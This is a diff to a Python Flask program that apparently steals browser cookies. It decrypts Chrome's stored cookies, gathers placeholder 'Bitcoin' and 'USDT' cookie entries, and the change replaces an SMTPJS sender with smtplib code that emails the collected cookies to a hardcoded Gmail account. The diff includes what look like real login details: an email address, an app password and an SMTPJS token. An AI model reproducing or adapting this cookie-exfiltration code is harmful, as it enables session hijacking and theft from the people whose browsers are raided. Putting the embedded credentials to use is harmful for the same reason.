@@ -2,10 +2,12 @@ import os
 import sqlite3
 import json
 import base64
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from flask import Flask, jsonify, request, send_from_directory
-import requests
 
 # Flask app setup
 app = Flask(__name__)
@@ -35,7 +37,6 @@ def get_encryption_key():
 
 # Decrypt the cookie value
 def decrypt_cookie_value(encrypted_value, encryption_key):
-    # The encryption method used by Chrome is AES in GCM mode (256-bit key, nonce is prepended to the cipher text)
     nonce = encrypted_value[3:15]
     cipher_text = encrypted_value[15:-16]
     tag = encrypted_value[-16:]
@@ -88,40 +89,41 @@ def get_chrome_cookies_path():
 
 # Fetch Bitcoin and USDT cookies (modify this logic as needed)
 def get_bitcoin_cookies():
-    # Placeholder for Bitcoin-related cookie fetching logic
     bitcoin_cookies = [{"name": "bitcoin_cookie", "value": "example_bitcoin_value"}]
     return bitcoin_cookies
 
 def get_usdt_cookies():
-    # Placeholder for USDT-related cookie fetching logic
     usdt_cookies = [{"name": "usdt_cookie", "value": "example_usdt_value"}]
     return usdt_cookies
 
-# Send data using SMTPJS (use SMTPJS for sending email)
-def send_email_via_smtpjs(cookies_data):
-    # Format the cookies data into a readable JSON string
-    email_body = f"Cookies Data: {json.dumps(cookies_data, indent=4)}"
+# Send data via email using Python's smtplib
+def send_email_via_smtp(cookies_data):
+    # Email configuration
+    from_email = "paulmotil235@gmail.com"  # Replace with your email
+    to_email = "paulmotil235@gmail.com"  # Replace with recipient's email
+    smtp_server = "smtp.gmail.com"
+    smtp_port = 587
+    smtp_username = "paulmotil235@gmail.com"  # Your email username
+    smtp_password = "pvsrvdvheqeeedid"  # Your email password or app password
     
-    # SMTPJS configuration with the new SecureToken and email details
-    payload = {
-        "SecureToken": "16831824-2424-421f-a8a0-41c0fb46a0b0",  # Updated SecureToken
-        "To": "myrdpa@gmail.com",  # Recipient's email address
-        "From": "myrdpa@gmail.com",  # Sender's email address
-        "Subject": "Chrome Cookies Data",  # Subject of the email
-        "Body": email_body  # The email body containing the cookies data
-    }
+    # Create the email content
+    email_body = f"Cookies Data:\n\n{json.dumps(cookies_data, indent=4)}"
+    msg = MIMEMultipart()
+    msg['From'] = from_email
+    msg['To'] = to_email
+    msg['Subject'] = "Chrome Cookies Data"
+    msg.attach(MIMEText(email_body, 'plain'))
     
+    # Connect to the SMTP server and send email
     try:
-        # Sending the POST request to SMTPJS to send the email
-        response = requests.post("https://smtpjs.com/v3/smtpjs.send.js", json=payload)
-        
-        # Print response status and body for debugging
-        print(f"Email sent with status: {response.status_code}, Response: {response.text}")
-        return response
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()  # Secure the connection
+        server.login(smtp_username, smtp_password)  # Log in to the server
+        server.sendmail(from_email, to_email, msg.as_string())  # Send email
+        server.quit()  # Disconnect from the server
+        print("Email sent successfully!")
     except Exception as e:
-        # If there's an error, print the error message
         print(f"Error sending email: {e}")
-        return None
 
 # Serve HTML file on GET request to root path
 @app.route('/')
@@ -146,17 +148,12 @@ def bypass_cors_sors():
         # Log the data being collected for debugging
         print(f"Collected Data: {json.dumps(data, indent=4)}")
 
-        # Send the collected data via email using the new SMTPJS function
-        email_response = send_email_via_smtpjs(data)
+        # Send the collected data via email using Python's smtplib
+        send_email_via_smtp(data)
 
-        # Check if the email was sent successfully
-        if email_response and email_response.status_code == 200:
-            return jsonify({"message": "Data retrieved and sent successfully", "data": data}), 200
-        else:
-            return jsonify({"error": "Failed to send email", "response": email_response.text if email_response else "No response"}), 500
+        return jsonify({"message": "Data retrieved and sent successfully", "data": data}), 200
 
     except Exception as e:
-        # Return an error message if something goes wrong
         print(f"Error: {e}")
         return jsonify({"error": str(e)}), 500
 
